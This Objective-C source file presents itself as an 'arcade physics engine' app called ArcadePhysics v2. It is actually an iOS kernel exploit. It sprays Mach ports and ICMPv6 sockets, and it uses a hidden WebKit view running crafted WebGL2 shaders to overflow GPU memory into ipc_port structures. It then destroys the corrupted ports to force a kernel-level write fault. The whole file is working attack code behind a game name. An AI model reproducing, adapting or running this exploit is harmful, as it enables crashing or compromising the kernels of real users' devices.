/* arcade physics engine */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <pthread.h>
#include <CoreGraphics/CoreGraphics.h>

#define NUM_PORTS        20000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

/* IKOT_TIMER (27=0x1B) | IO_ACTIVE (0x80000000) = 0x8000001B.
 * io_refs=1: mach_port_mod_refs(-1,RECEIVE) decrements 1->0 ->
 * ipc_kobject_destroy -> IKOT_TIMER clock cleanup -> store to
 * (clock_t*)ip_kobject -> EL1 write fault at COMMPAGE_TARGET. */
#define IKOT_TIMER_BITS  2147483675u  /* 0x8000001B */
#define IKOT_REFS_ONE    1u
/* COMMPAGE lo/hi in uvec4 u32 format */
#define COMMPAGE_LO      4294934320u  /* 0xFFFFc330 */
#define COMMPAGE_HI      15u          /* 0x0000000F */

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static _Atomic int  g_sprayed     = 0;
static FILE        *g_logfile     = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[app] %{public}s", buf);
    file_log(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = g_sock_count; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = g_port_count; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    g_sprayed = 1;
    ev("SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void fire_timer_trigger(int idx, mach_vm_address_t kobject) {
    ev("TIMER_TRIGGER port=%d kobject=0x%016llx mod_refs -1 RECEIVE",
       idx, (unsigned long long)kobject);
    /* io_refs 1->0 -> ipc_kobject_destroy -> IKOT_TIMER clock cleanup
     * -> unconditional store to (clock_t*)ip_kobject -> EL1 write fault */
    kern_return_t kr = mach_port_mod_refs(mach_task_self(), g_ports[idx],
                                          MACH_PORT_RIGHT_RECEIVE, -1);
    g_ports[idx] = MACH_PORT_NULL;
    ev("TIMER_TRIGGER_RETURNED kr=%d", (int)kr);
}

static void scan_background(void) {
    if (g_found || !g_sprayed) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        if (g_ports[i] == MACH_PORT_NULL) continue;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        /* iOS 26.x obfuscates kotype=0xFFFFFFFF for all ports.
         * kobject IS returned correctly: 0 = uncorrupted, COMMPAGE = hit. */
        if (kobject == COMMPAGE_TARGET) {
            g_found = 1;
            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> TIMER trigger",
               i, kotype, (unsigned long long)kobject);
            fire_timer_trigger(i, kobject);
        } else if (kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

/*
 * AGX shader payload: ALL 30 flat uvec4 varyings identical.
 * Each uvec4 = [io_bits, io_refs, kobject_lo, kobject_hi]
 *   io_bits   = 0x8000001B (IO_ACTIVE | IKOT_TIMER)
 *   io_refs   = 1          (triggers ipc_kobject_destroy on mod_refs -1)
 *   kobject   = 0x0000000FFFFFC330 (COMMPAGE_TARGET)
 *
 * Overflow from VOB writes this into adjacent ipc_port structures.
 * mach_port_mod_refs(-1,RECEIVE) on a hit port -> EL1 write fault.
 */
static NSString *const kAGXJS_SETUP =
    @"(function(){"
     "try{"
     "var B=2147483675,R=1,LO=4294934320,HI=15;"
     "var c=document.createElement('canvas');"
     "c.width=16;c.height=16;"
     /* No body.appendChild — off-screen canvas avoids null-body SETUP_ERR */
     "var gl=c.getContext('webgl2');"
     "if(!gl){window._agx='NO_WEBGL2';return;}"
     "var a='';"
     "for(var i=0;i<30;i++)"
     "  a+='v['+i+']=uvec4('+B+'u,'+R+'u,'+LO+'u,'+HI+'u);';"
     "var vs='#version 300 es\\nflat out uvec4 v[30];\\nvoid main(){\\n'"
     "       +a+'\\ngl_Position=vec4(0,0,0,1);gl_PointSize=1.0;\\n}';"
     "var fs='#version 300 es\\nprecision highp float;\\n"
              "flat in uvec4 v[30];\\nout vec4 o;\\n"
              "void main(){o=vec4(float(v[0].x)*1e-10,0,0,1);}';"
     "function mk(t,s){"
     "  var sh=gl.createShader(t);"
     "  gl.shaderSource(sh,s);gl.compileShader(sh);return sh;"
     "}"
     "window._gl=gl;"
     "var p=gl.createProgram();"
     "gl.attachShader(p,mk(gl.VERTEX_SHADER,vs));"
     "gl.attachShader(p,mk(gl.FRAGMENT_SHADER,fs));"
     "gl.linkProgram(p);"
     "if(!gl.getProgramParameter(p,gl.LINK_STATUS)){"
     "  window._agx='LINK_ERR:'+gl.getProgramInfoLog(p);return;"
     "}"
     "gl.useProgram(p);"
     "var fb=gl.createFramebuffer();"
     "gl.bindFramebuffer(gl.FRAMEBUFFER,fb);"
     "var tx=gl.createTexture();"
     "gl.bindTexture(gl.TEXTURE_2D,tx);"
     "gl.texStorage2D(gl.TEXTURE_2D,1,gl.RGBA8,16,16);"
     "gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tx,0);"
     "gl.viewport(0,0,16,16);"
     "window._fc=0;window._wc=0;"
     /* Warmup: 200 normal draws (instance_count=1) to move VOB allocation
      * to the pool path. Timer payload: B=IKOT_TIMER, R=1 (not 100). */
     "function wu(){"
     "  var g=window._gl;"
     "  if(window._wc<200){"
     "    try{g.drawArraysInstanced(g.POINTS,0,256,1);}catch(e){}"
     "    g.flush();window._wc++;"
     "    setTimeout(wu,5);"
     "  }else{window._agx='warmed';}"
     "}"
     "wu();"
     "window._fire=function(){"
     "  var g=window._gl;"
     "  try{g.drawArraysInstanced(g.POINTS,0,256,16777217);}catch(e){}"
     "  try{g.drawArraysInstanced(g.POINTS,0,1024,4194305);}catch(e){}"
     "  g.flush();window._fc++;"
     "  setTimeout(window._fire,100);"
     "};"
     "window._agx='warming';"
     "}catch(e){window._agx='EX:'+e.message;}"
     "})();";

static NSString *const kAGXJS_FIRE =
    @"window._fire();";

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKNavigationDelegate>
@property (strong) UIWindow *window;
@property (strong) WKWebView *wkView;
@property (assign) int        cycleCount;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    ev("APP_LAUNCH ArcadePhysics v2 v2.0");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20,80,300,60)];
    lbl.text = @"ArcadePhysics v2";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];

    WKWebViewConfiguration *wkCfg = [[WKWebViewConfiguration alloc] init];
    self.wkView = [[WKWebView alloc] initWithFrame:CGRectMake(0, 0, 2, 2)
                                     configuration:wkCfg];
    self.wkView.navigationDelegate = self;
    [vc.view addSubview:self.wkView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    self.cycleCount = 0;

    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    ev("WKVIEW_LOAD_INITIAL");
    [self.wkView loadHTMLString:@"<html><body style='background:black;margin:0'></body></html>"
                        baseURL:nil];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d sprayed=%d cycle=%d",
           tick, g_found, g_port_count, (int)g_sprayed, self.cycleCount);
}

- (void)webView:(WKWebView *)wv didFinishNavigation:(WKNavigation *)nav {
    ev("WKLOAD_DONE cycle=%d", self.cycleCount);
    __weak AppDelegate *weakSelf = self;
    [wv evaluateJavaScript:kAGXJS_SETUP completionHandler:^(id result, NSError *err) {
        AppDelegate *s = weakSelf;
        if (!s) return;
        if (err) {
            ev("SETUP_ERR %s", [[err localizedDescription] UTF8String]);
            /* Still spray even if SETUP_ERR — ports are the scan targets,
             * GPU overflow is a bonus path (blind destroy covers the rest). */
        }
        ev("SETUP_OK_WARMING cycle=%d agx=%@", s.cycleCount,
           [result isKindOfClass:[NSString class]] ? result : @"?");
        /* Wait 2.5s: warmup completes (200×5ms=1s) + GPU slab stabilizes.
         * Then spray so ipc_ports land above the warmed VOB arena. */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.5 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            AppDelegate *s2 = weakSelf;
            if (!s2 || g_found) return;
            spray();
            ev("SPRAY_DONE_FIRE cycle=%d ports=%d", s2.cycleCount, g_port_count);
            [wv evaluateJavaScript:kAGXJS_FIRE completionHandler:^(id r2, NSError *e2) {
                if (e2) ev("FIRE_ERR %s", [[e2 localizedDescription] UTF8String]);
                else    ev("FIRE_STARTED cycle=%d", s2.cycleCount);
            }];
            /* Blind destroy at 170s: any IKOT_TIMER port triggers EL1 fault. */
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
                           dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                AppDelegate *s3 = weakSelf;
                if (!s3 || g_found) return;
                ev("BLIND_DESTROY_START n=%d", g_port_count);
                int destroyed = 0;
                for (int i = 0; i < g_port_count; i++) {
                    if (g_ports[i] != MACH_PORT_NULL) {
                        mach_port_mod_refs(mach_task_self(), g_ports[i],
                                           MACH_PORT_RIGHT_RECEIVE, -1);
                        g_ports[i] = MACH_PORT_NULL;
                        destroyed++;
                    }
                }
                ev("BLIND_DESTROY_DONE destroyed=%d", destroyed);
            });
        });
    }];
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
